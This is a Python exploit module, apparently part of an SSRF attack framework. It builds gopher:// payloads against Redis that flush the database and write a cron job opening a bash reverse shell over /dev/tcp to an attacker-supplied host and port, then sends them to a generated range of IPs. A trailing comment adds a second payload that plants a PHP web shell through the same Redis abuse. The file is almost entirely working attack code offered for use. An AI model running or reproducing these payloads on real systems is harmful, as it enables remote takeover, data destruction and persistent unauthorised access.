import logging

from core.utils import *

name = "redis"
description = "Redis 远程代码执行 - Crontab 反弹 shell"
author = "Swissky"
documentation = [
    "https://maxchadwick.xyz/blog/ssrf-exploits-against-redis",
    "http://vinc.top/2016/11/24/server-side-request-forgery/",
]


class exploit:
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = "4242"
    SERVER_CRON = "/var/lib/redis"

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")

        # 处理反弹 shell 参数
        if args.lhost == None:
            self.SERVER_HOST = input("服务器主机:")
        else:
            self.SERVER_HOST = args.lhost

        if args.lport == None:
            self.SERVER_PORT = input("服务器端口:")
        else:
            self.SERVER_PORT = args.lport

        self.SERVER_CRON = input("服务器 Cron 目录（例如 /var/spool/cron/）:")
        self.LENGTH_PAYLOAD = 65 - len("SERVER_HOST") - len("SERVER_PORT")
        self.LENGTH_PAYLOAD = self.LENGTH_PAYLOAD + len(str(self.SERVER_HOST))
        self.LENGTH_PAYLOAD = self.LENGTH_PAYLOAD + len(str(self.SERVER_PORT))

        # 使用生成器创建主机列表
        # 如需攻击其它目标，请修改下面的 IP
        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:
            # 服务的数据和端口
            port = "6379"
            data = "*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$LENGTH_PAYLOAD%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/SERVER_HOST/SERVER_PORT%200>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0aSERVER_CRON%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a"
            payload = wrapper_gopher(data, ip, port)

            # 处理反弹 shell 参数
            payload = payload.replace("SERVER_HOST", self.SERVER_HOST)
            payload = payload.replace("SERVER_PORT", self.SERVER_PORT)
            payload = payload.replace("SERVER_CRON", self.SERVER_CRON)
            payload = payload.replace("LENGTH_PAYLOAD", str(self.LENGTH_PAYLOAD))

            if args.verbose == True:
                logging.info(f"生成的 payload : {payload}")

            # 发送 payload
            r = requester.do_request(args.param, payload)

            if args.verbose == True:
                logging.info(f"模块 '{name}' 已结束！")


"""
待办：
此利用方式仅在可以控制某个 cron 文件时才能生效。
通过 PHP 文件执行命令的功能尚未实现，简单示例如下。
gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2fwww%2f%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT
"""
